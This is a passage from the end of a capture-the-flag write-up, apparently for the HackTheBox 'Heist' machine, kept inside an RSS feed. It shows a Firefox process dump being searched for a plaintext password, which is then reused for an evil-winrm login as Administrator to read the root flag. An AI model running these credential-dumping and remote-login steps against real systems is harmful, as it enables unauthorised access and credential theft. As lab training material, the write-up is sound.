Copyright <span class="o">(</span>C<span class="o">)</span> 1999-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; dir


    Directory: C:<span class="se">\i</span>amf


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/12/2021  11:07 PM      <span class="m">547841456</span> firefox.exe_210712_230707.dmp
-a----        7/12/2021  11:18 PM      <span class="m">136871696</span> foxdump.txt
</code></pre></div><p>Searching for a string &ldquo;password&rdquo; in the converted dump file reveals the password used by admin (<code>4dD!5}x/re8]FBuZ</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; gc foxdump.txt <span class="p">|</span> <span class="k">select</span>-string <span class="s2">&#34;password&#34;</span>

<span class="s2">&#34;C:\Program Files\Mozilla Firefox\firefox.exe&#34;</span> localhost/login.php?login_username<span class="o">=</span>admin@support.htb<span class="p">&amp;</span><span class="nv">login_password</span><span class="o">=</span>4dD!5<span class="o">}</span>x/re8<span class="o">]</span>FBuZ<span class="p">&amp;</span><span class="nv">login</span><span class="o">=</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p><strong>[Side note]</strong></p>
<p>If this was done by automation script, maybe I could try to drop a packet sniffer before dumping the whole process.</p>
<p><img class="img-container" src="imgs/image-20210726192951302.png" alt="image-20210726192951302"  />
</p>
<h4 id="winrm---administrator">WinRM - Administrator</h4>
<p>The password <code>4dD!5}x/re8]FBuZ</code> is reused for administrator account.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ evil-winrm -i 10.10.10.149 -u <span class="s1">&#39;Administrator&#39;</span> -p <span class="s1">&#39;4dD!5}x/re8]FBuZ&#39;</span>

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; whoami<span class="p">;</span> hostname<span class="p">;</span> ipconfig<span class="p">;</span> <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
supportdesk<span class="se">\a</span>dministrator
SupportDesk

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::60f9:33ef:49c0:aa91
   Link-local IPv6 Address . . . . . : fe80::60f9:33ef:49c0:aa91%15
   IPv4 Address. . . . . . . . . . . : 10.10.10.149
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
                                       10.10.10.2
50dfa...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://davidbombal.com/cisco-type-7-password-decryption/">https://davidbombal.com/cisco-type-7-password-decryption/</a></li>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
